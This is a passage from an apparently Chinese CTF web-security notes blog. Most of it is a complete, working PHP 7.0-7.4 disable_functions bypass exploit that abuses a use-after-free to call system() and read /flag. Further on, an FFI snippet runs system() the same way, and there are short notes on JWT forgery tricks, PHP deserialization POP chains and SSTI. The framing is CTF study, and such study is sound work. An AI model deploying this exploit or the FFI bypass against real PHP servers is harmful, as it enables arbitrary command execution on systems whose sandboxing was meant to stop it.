class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PHP 7.0-7.4 disable_functions bypass PoC (*nix only)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Bug: https://bugs.php.net/bug.php?id=76047</span></span><br><span class="line"><span class="comment"># debug_backtrace() returns a reference to a variable </span></span><br><span class="line"><span class="comment"># that has been destroyed, causing a UAF vulnerability.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This exploit should work on all PHP 7.0-7.4 versions</span></span><br><span class="line"><span class="comment"># released as of 30/01/2020.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Author: https://github.com/mm0r1</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">pwn</span>(<span class="string">&quot;tac /flag&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;<span class="title function_ invoke__">getTrace</span>(); <span class="comment"># ;)</span></span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123; <span class="comment"># PHP &gt;= 7.4</span></span><br><span class="line">                <span class="variable">$backtrace</span> = <span class="title function_ invoke__">debug_backtrace</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">chr</span>(<span class="variable">$v</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;constant&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;bin2hex&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment"># str_shuffle prevents opcache string interning</span></span><br><span class="line">        <span class="variable">$arg</span> = <span class="title function_ invoke__">str_shuffle</span>(<span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;A&#x27;</span>, <span class="number">79</span>));</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> <span class="title class_">Vuln</span>();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; <span class="comment"># increase this value if UAF fails</span></span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_shuffle</span>(<span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;A&#x27;</span>, <span class="number">79</span>));</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">trigger_uaf</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leaks</span></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake value</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake reference</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake closure object</span></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); <span class="comment"># internal func type</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); <span class="comment"># internal func handler</span></span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="17-8-FFI-扩展"><a href="#17-8-FFI-扩展" class="headerlink" title="17.8  FFI 扩展"></a>17.8  FFI 扩展</h2><blockquote>
<p>PHP &gt;= 7.4<br>开启了 FFI 扩展且 ffi.enable=true </p>
</blockquote>
<p>方法一：蚁剑插件PHP74_FFI</p>
<p>方法二：脚本</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ffi</span> = FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int system(const char *command);&quot;</span>);</span><br><span class="line"><span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">system</span>(<span class="string">&quot;tac /flag &gt; /tmp/hack&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/tmp/hack&quot;</span>);</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;/tmp/hack&quot;</span>);</span><br></pre></td></tr></table></figure>
<h2 id="17-9-iconv"><a href="#17-9-iconv" class="headerlink" title="17.9 iconv"></a>17.9 iconv</h2><p>蚁剑方法同11.4</p>
<h1 id="18-JSON-Web-Token"><a href="#18-JSON-Web-Token" class="headerlink" title="18. JSON Web Token"></a>18. JSON Web Token</h1><p>认识JWT：<a target="_blank" rel="noopener" href="https://www.wolai.com/ctfhub/hcFRbVUSwDUD1UTrPJbkob">https://www.wolai.com/ctfhub/hcFRbVUSwDUD1UTrPJbkob</a></p>
<p>以下writeup看：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46150940/article/details/113440680">https://blog.csdn.net/qq_46150940/article/details/113440680</a></p>
<h2 id="18-1-无签名"><a href="#18-1-无签名" class="headerlink" title="18.1 无签名"></a>18.1 无签名</h2><p>一些JWT库也支持none算法，即不使用签名算法。当alg字段为空时，后端将不执行签名验证。 </p>
<h2 id="18-2-弱密钥"><a href="#18-2-弱密钥" class="headerlink" title="18.2 弱密钥"></a>18.2 弱密钥</h2><p>如果JWT采用对称加密算法，并且密钥的强度较弱的话，攻击者可以直接通过蛮力攻击方式来破解密钥。 </p>
<h2 id="18-3-修改签名算法"><a href="#18-3-修改签名算法" class="headerlink" title="18.3 修改签名算法"></a>18.3 修改签名算法</h2><p>有些JWT库支持多种密码算法进行签名、验签。若目标使用非对称密码算法时，有时攻击者可以获取到公钥，此时可通过修改JWT头部的签名算法，将非对称密码算法改为对称密码算法，从而达到攻击者目的。 </p>
<h1 id="19-PHP"><a href="#19-PHP" class="headerlink" title="19. PHP"></a>19. PHP</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">处理错误看日志，学习用法读文档</span><br></pre></td></tr></table></figure>
<p>WAMP-Windows Apache MySQL PHP</p>
<p>LAMP-Linux Apache MySQL PHP</p>
<p>echo/print</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo-可以输出一个或多个字符串，没有返回值</span><br><span class="line">print-只允许输出一个字符串(但可以用.连接字符串)，返回值总为1</span><br><span class="line">echo输出速度比print快</span><br><span class="line">echo &#x27;hh&#x27;,&#x27;aa&#x27;;</span><br><span class="line">print &#x27;hh&#x27;.&#x27;aa&#x27;;</span><br></pre></td></tr></table></figure>
<p>松散比较==，只比较值，不比较类型</p>
<p>严格比较===，比较值和类型</p>
<h2 id="19-1-序列化与反序列化"><a href="#19-1-序列化与反序列化" class="headerlink" title="19.1 序列化与反序列化"></a>19.1 序列化与反序列化</h2><p>序列化/反序列化 给我们传递对象提供了一种简单的办法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">serialize()将一个对象转化成一个字符串</span><br><span class="line">unserialize()将字符串还原为一个对象</span><br></pre></td></tr></table></figure>
<p>反序列化与POP链(Property-Oriented Programing)</p>
<p>与二进制的ROP(Return-Oriented Programing)原理相似，从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。</p>
<p>__toString()触发条件：</p>
<ol>
<li>echo($obj)/print($obj)</li>
<li>字符串连接时</li>
<li>格式化字符串时</li>
<li>与字符串进行\==比较时(PHP进行==比较时会转换参数类型)</li>
<li>格式化SQL语句，绑定参数时</li>
<li>数组中有字符串时</li>
</ol>
<h1 id="20-模板注入"><a href="#20-模板注入" class="headerlink" title="20. 模板注入"></a>20. 模板注入</h1><p>SSTI(Server-side temple injection)服务端模板注入</p>

    </div>

    
    
    
        <div class="reward-container">
  <div></div>
  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
    打赏
  </button>
  <div id="qr" style="display: none;">
      
      <div style="display: inline-block;">
